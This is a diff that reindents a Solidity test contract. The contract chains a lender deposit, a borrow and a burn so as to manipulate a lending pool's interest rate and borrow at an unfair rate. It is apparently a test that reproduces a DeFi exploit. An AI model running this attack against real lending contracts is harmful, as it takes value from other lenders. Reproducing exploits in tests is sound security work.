@@ -31,45 +31,54 @@ contract MintLoanAndBorrowTest {
 	function callMintAndBorrowAndBurn(
 		address loanToken, /// Underlying Token.
 		address iToken, /// Lending Pool iToken.
-        address collateralToken, /// Collateral Token.
+		address collateralToken, /// Collateral Token.
 		uint256 hackDepositAmount, /// Amount of underlying token to deposit on lending pool.
-        uint256 withdrawAmount, /// Borrowing principal.
-        uint256 collateralTokenSent /// Borrowing collateral.
+		uint256 withdrawAmount, /// Borrowing principal.
+		uint256 collateralTokenSent /// Borrowing collateral.
 	) public {
 		IToken iTokenContract = IToken(iToken);
 
 		/// @dev Allow the lending pool, iToken to get a deposit from this contract as a lender.
 		IERC20(loanToken).approve(iToken, hackDepositAmount);
 
-        /// @dev Check this contract has the underlying tokens to deposit.
-        require(IERC20(loanToken).balanceOf(address(this)) >= hackDepositAmount, "This contract has not the required balance: hackDepositAmount.");
+		/// @dev Check this contract has the underlying tokens to deposit.
+		require(
+			IERC20(loanToken).balanceOf(address(this)) >= hackDepositAmount,
+			"This contract has not the required balance: hackDepositAmount."
+		);
 
-        /// @dev Check this contract has the allowance to move the tokens to the lending pool.
-        require(IERC20(loanToken).allowance(address(this), iToken) >= hackDepositAmount, "This contract has not the allowance to move hackDepositAmount.");
+		/// @dev Check this contract has the allowance to move the tokens to the lending pool.
+		require(
+			IERC20(loanToken).allowance(address(this), iToken) >= hackDepositAmount,
+			"This contract has not the allowance to move hackDepositAmount."
+		);
 
 		/// @dev Make a deposit as a lender, in order to manipulate the interest rate of the lending pool.
 		iTokenContract.mint(address(this), hackDepositAmount);
 
-        /// @dev Check this contract has the collateral tokens to deposit.
-        require(IERC20(collateralToken).balanceOf(address(this)) >= collateralTokenSent, "This contract has not the required balance: collateralTokenSent.");
+		/// @dev Check this contract has the collateral tokens to deposit.
+		require(
+			IERC20(collateralToken).balanceOf(address(this)) >= collateralTokenSent,
+			"This contract has not the required balance: collateralTokenSent."
+		);
 
 		/// @dev Borrow liquidity from the pool at an unfair rate.
 		iTokenContract.borrow(
-            "0x0", /// loanId, 0 if new loan.
-            withdrawAmount,
-            86400, /// initialLoanDuration
-            collateralTokenSent,
-            collateralToken, /// collateralTokenAddress
-            address(this), /// borrower
-            address(this), /// receiver
-            "0x0"
-        );
+			"0x0", /// loanId, 0 if new loan.
+			withdrawAmount,
+			86400, /// initialLoanDuration
+			collateralTokenSent,
+			collateralToken, /// collateralTokenAddress
+			address(this), /// borrower
+			address(this), /// receiver
+			"0x0"
+		);
 
 		/// @dev Get back the amount deposited in the first place.
 		iTokenContract.burn(address(this), hackDepositAmount);
 	}
 
-	function getBalance(address loanToken) public view returns(uint256) {
+	function getBalance(address loanToken) public view returns (uint256) {
 		return IERC20(loanToken).balanceOf(address(this));
 	}
 }
